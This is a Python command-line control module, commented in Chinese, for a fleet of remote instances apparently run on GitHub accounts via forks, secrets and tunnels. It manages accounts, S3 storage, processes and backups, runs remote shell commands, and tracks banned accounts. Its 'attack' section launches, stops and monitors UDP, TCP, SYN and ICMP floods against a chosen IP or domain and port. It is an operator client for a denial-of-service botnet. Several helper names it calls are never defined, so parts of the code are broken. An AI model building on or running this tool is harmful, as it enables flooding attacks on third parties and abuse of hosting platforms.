# -*- coding: utf-8 -*-
"""
管理操作（实例/账号/任务/日志/S3/进程/备份/攻击）

所有操作通过 manager API 或直接请求实例 API。
"""
import time
from cli import api, config


def _input(prompt):
    try:
        val = input(prompt).strip()
        return val if val else None
    except (KeyboardInterrupt, EOFError):
        return None


def pick_instance(running_only=True):
    """选择实例，返回 instance dict 或 None"""
    d = api.get("/api/instances")
    insts = d.get("instances", [])
    if running_only:
        insts = [i for i in insts if i.get("status") in ("running", "starting")]
    if not insts:
        print("  没有可用实例")
        return None
    for idx, i in enumerate(insts):
        print(f"  [{idx}] {i['id']} -> {i.get('url', '')} ({i.get('status', '')})")
    sel = _input("  选择实例序号（留空取消）: ")
    if sel is None:
        return None
    try:
        return insts[int(sel)]
    except (ValueError, IndexError):
        print("  无效选择")
        return None


# ==================== 实例管理 ====================

def list_instances():
    d = api.get("/api/instances")
    insts = d.get("instances", [])
    if not insts:
        print("  暂无实例")
        return []
    print(f"  {'ID':<8}{'域名':<30}{'状态':<10}{'账号':<10}{'MCP':<10}")
    print("  " + "-" * 70)
    for i in insts:
        mcp = "有" if i.get("mcp_url") else "无"
        print(f"  {i['id']:<8}{i.get('hostname', ''):<30}{i.get('status', ''):<10}"
              f"{i.get('account', ''):<10}{mcp}")
    return insts


def create_instance():
    d = api.get("/api/accounts")
    accounts = d.get("accounts", [])
    if not accounts:
        print("  没有可用账号，请先添加账号")
        return
    print("  可用账号:")
    for idx, a in enumerate(accounts):
        print(f"    [{idx}] {a['name']} ({a.get('repo', '')})")
    print("    [auto] 自动选择最优账号")
    sel = _input("  选择账号（序号/auto，留空取消）: ")
    if sel is None:
        print("  已取消")
        return
    payload = {}
    if sel.lower() != "auto":
        try:
            payload = {"account": accounts[int(sel)]["name"]}
        except (ValueError, IndexError):
            print("  无效选择，使用自动选择")
    print("  正在创建新实例（隧道+MCP+启动）...")
    d = api.post("/api/instances", payload)
    if d.get("ok"):
        inst = d.get("instance", {})
        print(f"  创建成功: {inst.get('id')} -> {inst.get('url')}")
        if inst.get("mcp_url"):
            print(f"     MCP: {inst.get('mcp_url')}")
    else:
        print(f"  失败: {d.get('error')}")


def close_instance():
    insts = list_instances()
    if not insts:
        return
    inst_id = _input("  输入要关闭的实例 ID（留空取消）: ")
    if inst_id is None:
        return
    d = api.delete(f"/api/instances/{inst_id}")
    print(f"  {d.get('msg', d.get('error', ''))}")


# ==================== 账号管理 ====================

def list_accounts():
    d = api.get("/api/accounts")
    accounts = d.get("accounts", [])
    if not accounts:
        print("  暂无账号")
        return
    print(f"  {'名称':<10}{'仓库':<35}{'并发':<6}")
    print("  " + "-" * 55)
    for a in accounts:
        print(f"  {a['name']:<10}{a.get('repo', ''):<35}{a.get('max_concurrency', '')}")


def add_account():
    print("  （全自动：验证token->fork->secrets->报备）")
    name = _input("  账号名称（留空取消）: ")
    if name is None:
        return
    token = _input("  GitHub Token（留空取消）: ")
    if token is None:
        return
    d = api.post("/api/accounts", {"name": name, "token": token})
    if d.get("ok"):
        print(f"  {d.get('msg')}")
    else:
        print(f"  失败: {d.get('error')}")


# ==================== 任务/日志/总览 ====================

def list_tasks():
    d = api.get("/api/tasks")
    tasks = d.get("tasks", [])
    if not tasks:
        print("  暂无任务")
        return
    print(f"  {'ID':<22}{'类型':<15}{'状态':<10}{'重试':<4}{'错误':<30}")
    print("  " + "-" * 80)
    for t in tasks[-20:]:
        print(f"  {t.get('id', ''):<22}{t.get('type', ''):<15}{t.get('status', ''):<10}"
              f"{t.get('retries', 0):<4}{t.get('error', '')[:28]}")


def view_logs():
    limit_str = _input("  查看最近多少行日志（默认300，留空取消）: ")
    if limit_str is None:
        return
    try:
        limit = int(limit_str) if limit_str else 300
    except ValueError:
        limit = 300
    limit = max(10, min(limit, 2000))
    d = api.get(f"/api/logs?limit={limit}")
    if not d.get("ok"):
        print(f"  {d.get('error')}")
        return
    stats = d.get("stats", {})
    print(f"  统计: 错误 {stats.get('error', 0)} | 警告 {stats.get('warning', 0)}")
    print("  " + "-" * 80)
    for entry in d.get("logs", []):
        if isinstance(entry, dict):
            print(f"  [{entry.get('level', '')}] {entry.get('msg', '')}")


def overview():
    d = api.get("/api/overview")
    if not d.get("ok"):
        print(f"  {d.get('error')}")
        return
    print(f"  Leader: {d.get('leader')} | 运行: {d.get('elapsed')}s")
    print(f"  账号: {len(d.get('accounts', []))} | 实例: {len(d.get('instances', []))}")
    wh = d.get("worker_health", {})
    print(f"  Worker: 在线 {wh.get('online', 0)}/{wh.get('total', 0)}")
    s3 = d.get("s3", {})
    print(f"  S3: {'就绪' if s3.get('ready') else '未就绪'} | "
          f"账号 {s3.get('total_accounts', 0)} | 路由 {s3.get('routing_entries', 0)} | "
          f"存储 {s3.get('total_storage_mb', 0)}MB")
    tasks = d.get("tasks", {})
    if tasks:
        print(f"  任务: " + " | ".join(f"{k}={v}" for k, v in tasks.items()))


def s3_status():
    d = api.get("/api/s3/status")
    if not d.get("ok"):
        print(f"  错误: {d.get('error', '未知')}")
        return
    print(f"  就绪: {_ok('是') if d.get('ready') else _err('否')}")
    print(f"  总账号: {C.C}{d.get('total_accounts', 0)}{C.RST}")
    print(f"  活跃账号: {_ok(str(d.get('active_accounts', 0)))}")
    print(f"  降级账号: {_warn(str(d.get('degraded_accounts', 0))) if d.get('degraded_accounts',0) else str(d.get('degraded_accounts', 0))}")
    print(f"  不可用账号: {_err(str(d.get('unavailable_accounts', 0))) if d.get('unavailable_accounts',0) else str(d.get('unavailable_accounts', 0))}")
    print(f"  哈希环: {d.get('hash_ring_size', 0)}")
    print(f"  {_bold('--- 全局统计 ---')}")
    print(f"  {_dim('A类操作:')} {C.P}{d.get('total_a_ops', 0)}{C.RST}")
    print(f"  {_dim('B类操作:')} {C.P}{d.get('total_b_ops', 0)}{C.RST}")
    print(f"  {_dim('存储用量:')} {C.C}{d.get('total_storage_mb', 0)}{C.RST}MB")
    print(f"  {_bold('--- 来源拆分 ---')}")
    print(f"  Manager: A={d.get('manager_a_ops', 0)} B={d.get('manager_b_ops', 0)} 存储={d.get('manager_storage_mb', 0)}MB")
    w_cnt = d.get("worker_count", 0)
    if w_cnt:
        print(f"  Worker×{w_cnt}: A={d.get('worker_a_ops', 0)} B={d.get('worker_b_ops', 0)} 存储={d.get('worker_storage_mb', 0)}MB")



def list_processes():
    inst = pick_instance()
    if not inst:
        return
    d = api.get_inst(inst["hostname"], "/api/processes")
    if not d.get("ok"):
        print(f"  {d.get('error', '失败')}")
        return
    procs = d.get("processes", [])
    if not procs:
        print("  暂无持久化进程")
        return
    print(f"  {'名称':<20}{'PID':<8}{'状态':<10}{'命令':<30}")
    print("  " + "-" * 70)
    for p in procs:
        print(f"  {p.get('name', ''):<20}{str(p.get('pid', '')):<8}"
              f"{'运行' if p.get('running') else '停止':<10}{p.get('cmdline', '')[:28]}")


def snapshot_processes():
    inst = pick_instance()
    if not inst:
        return
    d = api.post_inst(inst["hostname"], "/api/processes/snapshot",
                      {"token": config.TOKEN})
    if d.get("ok"):
        print(f"  快照完成，持久化 {d.get('saved', 0)} 个进程")
    else:
        print(f"  失败: {d.get('error', d.get('msg', ''))}")


def start_process():
    inst = pick_instance()
    if not inst:
        return
    name = _input("  进程名称（留空取消）: ")
    if name is None:
        return
    d = api.post_inst(inst["hostname"], f"/api/processes/{name}/start",
                      {"token": config.TOKEN})
    print(f"  {d.get('msg', d.get('error', ''))}")


def stop_process():
    inst = pick_instance()
    if not inst:
        return
    name = _input("  进程名称（留空取消）: ")
    if name is None:
        return
    d = api.post_inst(inst["hostname"], f"/api/processes/{name}/stop",
                      {"token": config.TOKEN})
    print(f"  {d.get('msg', d.get('error', ''))}")


def restart_process():
    inst = pick_instance()
    if not inst:
        return
    name = _input("  进程名称（留空取消）: ")
    if name is None:
        return
    d = api.post_inst(inst["hostname"], f"/api/processes/{name}/restart",
                      {"token": config.TOKEN})
    print(f"  {d.get('msg', d.get('error', ''))}")


def process_log():
    inst = pick_instance()
    if not inst:
        return
    name = _input("  进程名称（留空取消）: ")
    if name is None:
        return
    limit_str = _input("  行数（默认200）: ") or "200"
    try:
        limit = max(10, min(int(limit_str), 2000))
    except ValueError:
        limit = 200
    d = api.get_inst(inst["hostname"],
                     f"/api/processes/{name}/log?limit={limit}&token={config.TOKEN}")
    if not d.get("ok"):
        print(f"  {d.get('error', '失败')}")
        return
    lines = d.get("lines", [])
    if not lines:
        print("  无日志")
        return
    for line in lines[-limit:]:
        print(f"  {line.rstrip()}")


def backup_now():
    inst = pick_instance()
    if not inst:
        return
    print("  正在备份（数据库+文件+进程快照+S3状态）...")
    d = api.post_inst(inst["hostname"], "/api/backup/now", {"token": config.TOKEN})
    if d.get("ok"):
        print(f"  备份完成: db={d.get('db_size', 0)}B files={d.get('files_size', 0)}B "
              f"耗时={d.get('elapsed', 0)}s")
    else:
        print(f"  失败: {d.get('error')}")


def exec_cmd():
    inst = pick_instance()
    if not inst:
        return
    cmd = _input("  输入命令（留空取消）: ")
    if cmd is None:
        return
    timeout_str = _input("  超时秒数（默认30）: ") or "30"
    try:
        timeout = max(1, min(int(timeout_str), 600))
    except ValueError:
        timeout = 30
    d = api.post("/api/instances/" + inst["id"] + "/exec",
                 {"cmd": cmd, "timeout": timeout})
    r = d.get("result") or d
    if r.get("ok"):
        out = r.get("stdout", "")
        if out:
            print(out, end="")
        err = r.get("stderr", "")
        if err:
            print(f"  [stderr] {err}")
        print(f"  [exit={r.get('code', '?')}]")
    else:
        print(f"  失败: {d.get('error', r.get('error', ''))}")


def resource_monitor():
    inst = pick_instance()
    if not inst:
        return
    d = api.get_inst(inst["hostname"], "/api/resource")
    if not d.get("ok"):
        print(f"  {d.get('error')}")
        return
    print(f"  内存: {d.get('mem_avail_kb', 0) // 1024}MB 可用 / {d.get('mem_total_kb', 0) // 1024}MB 总计")
    print(f"  磁盘: {d.get('disk_used_kb', 0) // 1024}MB 已用 / {d.get('disk_total_kb', 0) // 1024}MB 总计 ({d.get('disk_use_pct', 0)}%)")
    print(f"  运行: {d.get('elapsed', 0)}s")


# ==================== 攻击功能 ====================

def attack_start():
    inst = pick_instance()
    if not inst:
        return
    target = _input("  目标 IP/域名（留空取消）: ")
    if target is None:
        return
    atype = _input("  类型（udp/tcp/syn/icmp，默认udp）: ") or "udp"
    port_str = _input("  端口（默认80）: ") or "80"
    dur_str = _input("  持续秒数（默认60）: ") or "60"
    try:
        port, dur = int(port_str), int(dur_str)
    except ValueError:
        print("  无效数字")
        return
    d = api.post_inst(inst["hostname"], "/api/attack/start",
                      {"target": target, "type": atype, "port": port,
                       "duration": dur, "token": config.TOKEN})
    if d.get("ok"):
        print(f"  {d.get('msg')}")
    else:
        print(f"  失败: {d.get('error', d.get('msg', ''))}")


def attack_stop():
    inst = pick_instance()
    if not inst:
        return
    d = api.post_inst(inst["hostname"], "/api/attack/stop", {"token": config.TOKEN})
    print(f"  {d.get('msg', d.get('error', ''))}")


def attack_status():
    inst = pick_instance()
    if not inst:
        return
    d = api.get_inst(inst["hostname"], "/api/attack/status")
    if d.get("ok"):
        print(f"  运行: {d.get('running')} | 模式: {d.get('mode')} | "
              f"开始: {d.get('started_at')}")
        stats = d.get("stats", {})
        if stats:
            print(f"  统计: {stats}")
    else:
        print(f"  {d.get('error')}")


# ==================== S3 增强 ====================

def s3_health():
    d = api.get("/api/s3/health")
    if not d.get("ok"):
        print(f"  {d.get('error')}")
        return
    print(f"  活跃: {d.get('active', 0)} | 降级: {d.get('degraded', 0)} | 不可用: {d.get('unavailable', 0)} | 总计: {d.get('total', 0)}")


def s3_accounts():
    d = api.get("/api/s3/accounts")
    if not d.get("ok"):
        print(f"  {d.get('error')}")
        return
    accts = d.get("accounts", [])
    if not accts:
        print(f"  全部正常（{d.get('total', 0)} 个账号全部 active）")
        return
    print(f"  非 active 账号（共 {d.get('total_non_active', 0)} 个，显示前 {len(accts)}）：")
    print(f"  {'序号':<6}{'状态':<12}{'A类':<6}{'B类':<6}{'存储MB':<10}{'失败':<4}{'错误':<40}")
    print("  " + "-" * 80)
    for a in accts:
        print(f"  {a['idx']:<6}{a['status']:<12}{a['a_count']:<6}{a['b_count']:<6}"
              f"{a['used_mb']:<10}{a['fail_count']:<4}{a.get('last_error','')[:38]}")


# ==================== 代理 API（通过 manager 查看 worker）===================

def proxy_logs():
    inst = pick_instance()
    if not inst:
        return
    d = api.get(f"/api/instances/{inst['id']}/logs?limit=50")
    if not d.get("ok"):
        print(f"  {d.get('error')}")
        return
    import datetime
    for entry in d.get("logs", []):
        if isinstance(entry, dict):
            ts = entry.get("time", 0)
            bj = datetime.datetime.fromtimestamp(ts, tz=datetime.timezone(datetime.timedelta(hours=8)))
            print(f"  {bj.strftime('%H:%M:%S')} [{entry.get('level', '')}] {entry.get('msg', '')[:80]}")


def proxy_processes():
    inst = pick_instance()
    if not inst:
        return
    d = api.get(f"/api/instances/{inst['id']}/processes")
    if not d.get("ok"):
        print(f"  {d.get('error')}")
        return
    procs = d.get("processes", [])
    if not procs:
        print("  暂无进程")
        return
    for p in procs:
        print(f"  {p.get('name', ''):<20} pid={p.get('pid')} {'运行' if p.get('running') else '停止'}")


def proxy_resource():
    inst = pick_instance()
    if not inst:
        return
    d = api.get(f"/api/instances/{inst['id']}/resource")
    if not d.get("ok"):
        print(f"  {d.get('error')}")
        return
    print(f"  内存: {d.get('mem_avail_kb', 0) // 1024}MB 可用 / {d.get('mem_total_kb', 0) // 1024}MB")
    print(f"  磁盘: {d.get('disk_used_kb', 0) // 1024}MB / {d.get('disk_total_kb', 0) // 1024}MB ({d.get('disk_use_pct', 0)}%)")
    print(f"  运行: {d.get('elapsed', 0)}s")

def s3_workers():
    """查看每个worker的S3状态"""
    d = api.get("/api/s3/workers")
    if not d.get("ok"):
        print(f"  错误: {d.get('error', '未知')}")
        return
    workers = d.get("workers", [])
    print(f"  Worker S3状态 ({d.get('total', 0)}个):\n")
    for w in workers:
        import time as _t
        seen = _t.strftime("%H:%M:%S", _t.localtime(w.get("last_seen", 0)))
        print(f"  {w['instance']}:")
        print(f"    S3: active={w.get('active',0)} degraded={w.get('degraded',0)} unavailable={w.get('unavailable',0)}")
        print(f"    操作: A={w.get('a_ops',0)} B={w.get('b_ops',0)} 存储={w.get('storage_mb',0)}MB")
        print(f"    进程: {w.get('procs',0)} 磁盘: {w.get('disk_pct',0)}% 最后上报: {seen}\n")

def backup_history(inst_id):
    """查看备份历史"""
    d = api.get(f"/api/instances/{inst_id}/backup-history")
    if not d.get("ok"):
        print(f"  错误: {d.get('error', '未知')}"); return
    history = d.get("history", [])
    print(f"  备份历史 ({len(history)}条):\n")
    for h in history[:20]:
        import time as _t
        ts = _t.strftime("%m-%d %H:%M:%S", _t.localtime(h.get("timestamp", 0)))
        status = h.get("status", "?")
        size = h.get("size_bytes", 0)
        size_mb = round(size / 1048576, 1) if size else 0
        _status = _ok(status) if status == "success" else _err(status)
        print(f"  {ts} [{_status}] {C.C}{size_mb}{C.RST}MB {_dim(f'A={h.get("a_delta",0)} B={h.get("b_delta",0)}')}")
        if h.get("log"):
            print(f"    {h['log'][:80]}")
    if not history:
        print("  暂无历史")


def restore_history(inst_id):
    """查看恢复历史"""
    d = api.get(f"/api/instances/{inst_id}/restore-history")
    if not d.get("ok"):
        print(f"  错误: {d.get('error', '未知')}"); return
    history = d.get("history", [])
    print(f"  恢复历史 ({len(history)}条):\n")
    for h in history[:20]:
        import time as _t
        ts = _t.strftime("%m-%d %H:%M:%S", _t.localtime(h.get("timestamp", 0)))
        status = h.get("status", "?")
        print(f"  {ts} [{status}] A={h.get('a_delta',0)} B={h.get('b_delta',0)}")
        if h.get("log"):
            print(f"    {h['log'][:80]}")
    if not history:
        print("  暂无历史")


def timeline(inst_id):
    """查看完整时间线"""
    d = api.get(f"/api/instances/{inst_id}/timeline")
    if not d.get("ok"):
        print(f"  错误: {d.get('error', '未知')}"); return
    tl = d.get("timeline", [])
    print(f"  时间线 ({len(tl)}条):\n")
    for e in tl[:30]:
        import time as _t
        ts = _t.strftime("%m-%d %H:%M:%S", _t.localtime(e.get("timestamp", 0)))
        etype = e.get("type", "?")
        status = e.get("status", "?")
        extra = f"{round(e.get('size_bytes',0)/1048576,1)}MB" if e.get("size_bytes") else ""
        print(f"  {ts} [{etype}] [{status}] {extra}")
    if not tl:
        print("  暂无记录")


def banned_accounts():
    """查看被封账号"""
    d = api.get("/api/accounts/banned")
    if not d.get("ok"):
        print(f"  错误: {d.get('error', '未知')}"); return
    banned = d.get("banned", [])
    print(f"  被封账号 ({len(banned)}个):\n")
    for b in banned:
        print(f"  {b.get('name','?')} | 仓库: {b.get('repo','?')} | 封禁: {b.get('banned_at','?')} | 原因: {b.get('reason','?')}")
    if not banned:
        print("  无被封账号")


def worker_stats(inst_id):
    """查看单个worker统计"""
    d = api.get(f"/api/instances/{inst_id}/stats")
    if not d.get("ok"):
        print(f"  错误: {d.get('error', '未知')}"); return
    print(f"  {_bold(f'=== {inst_id} 统计 ===')}")
    print(f"  A类总次数: {d.get('a_count_total', 0)}")
    print(f"  B类总次数: {d.get('b_count_total', 0)}")
    print(f"  存储用量: {d.get('storage_mb', 0)}MB")
    print(f"  最后备份: {d.get('last_backup', 0)}")
    print(f"  最后恢复: {d.get('last_restore', 0)}")
    print(f"  进程数: {d.get('procs', 0)}")
    print(f"  磁盘: {d.get('disk_pct', 0)}%")
